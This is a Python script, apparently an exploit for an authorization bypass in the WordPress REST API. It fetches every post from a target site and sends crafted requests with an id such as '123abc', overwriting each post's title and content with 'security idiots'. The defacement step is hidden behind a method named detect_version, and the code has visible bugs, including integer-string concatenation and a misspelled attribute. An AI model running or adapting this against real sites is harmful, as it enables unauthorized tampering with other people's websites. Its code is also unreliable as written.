import requests
import sys
import validators

class WP():
	def __init__(self, uri=None):
		self.verion = None
		self.vuln_path = '/wp-json/wp/v2/posts/'
		self.detect_version(uri)

	def detect_version(self, uri=None):
		if not validators.url(uri):
			print('incorect uri')
			sys.exit(0)
		# get posts from api wp
		headers = {'user-agent': 'security-idiots/0.0.1', 'content-type': 'application/json; charset=utf8'}
		r = requests.get(uri + self.vuln_path, headers=headers)
		if r.status_code == 200:
			for post in r.json():
				print(post['id'] + '|' + uri)
				payload = {'title': 'security idiots', 'content': 'security idiots'}
				requests.post(uri + self.vuln_path + '%s' \
					% post['id'] + '?id=%s' % post['id'] + 'abc', params=payload, headers=headers)

		else:
			print(r.status_code)
